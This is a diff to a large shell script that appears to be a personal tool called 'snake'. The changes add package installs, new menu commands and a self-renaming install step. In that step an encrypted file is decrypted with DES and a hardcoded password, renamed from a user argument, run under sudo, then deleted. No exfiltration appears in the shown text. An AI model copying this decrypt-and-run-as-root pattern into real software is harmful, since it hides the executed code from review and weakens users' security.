+  if [ -f ~/.spx/snake ]; then
+    _loc=~/.spx/snake
+  else
+    openssl des -d -in snake.sslz -out snake -pass pass:cartof
+    _loc=~/.spx/snake
+  fi
+fi
+
+
+  _system="$(uname -s)"
+
+
+
+
+
+ if [ $_system == "Darwin" ]; then
+
+
+   _converted=$( echo $1 | rev | sed 's/./&./g' | awk '{print toupper($0)}' | sed 's/.$//')
+   _new="$(echo $1 | rev )"
+
+
+  cd ~
+  mkdir blana ; cd blana
+  sudo cp $_loc ./snake
+  sudo cp snake snake2
   sudo rm -rf snake
   cat snake2 | sed "s/snake/$_new/g" | sed "s/S.N.A.K.E/$_converted/g" > $_new
   sudo rm -rf snake2 ; sh $_new -qinstall ; sudo rm -rf $_new
@@ -7802,6 +8428,10 @@ _spread(){ #selfi
     sudo apt install speedtest-cli -y >/dev/null 2>&1
 
     sudo apt install gnome-screensaver -y >/dev/null 2>&1
+
+    sudo apt install gcc -y >/dev/null 2>&1
+
+    sudo apt install make -y >/dev/null 2>&1
 
   elif [[ $_type == "arch" ]]; then
 
@@ -10012,6 +10642,12 @@ _brew(){ #selfx
      else
         nano brew.sql
      fi
+   elif [[ $1 == "uxtl" ]]; then
+     if [ $2 == "uname" ]; then
+        printf "$RED Not supported yet$NC\n"
+     elif [[ $2 == "hostname" ]]; then
+        printf "$RED Not supported yet$NC\n"
+     fi
    elif [[ $1 == "magic" ]]; then
      printf "\n"
      printf "$NEW_BLUE HTML / CSS / C++ / C / *SH / ^H$NC\n"
@@ -10021,7 +10657,7 @@ _brew(){ #selfx
      printf "$NEW_BLUE XML$NC\n"
      printf "\n"
    else
-       printf "$NEW_BLUE Brew$YELLOW Error$NC\n"
+     printf "$NEW_BLUE Brew$YELLOW Error$NC\n"
    fi
 
 
@@ -10681,6 +11317,14 @@ elif [[ "$(echo $1 | grep -c 'change')" == "1" ]]; then
 elif [[ "$(echo $1 | grep -c 'pd')" == "1" ]]; then
 
   _pd
+
+elif [[ "$(echo $1 | grep -c 'uengage')" == "1" ]]; then
+
+  _u_engage
+
+elif [[ "$(echo $1 | grep -c 'udngage')" == "1" ]]; then
+
+  _u_disengage
 
 elif [[ "$1" == "_+" ]]; then
 
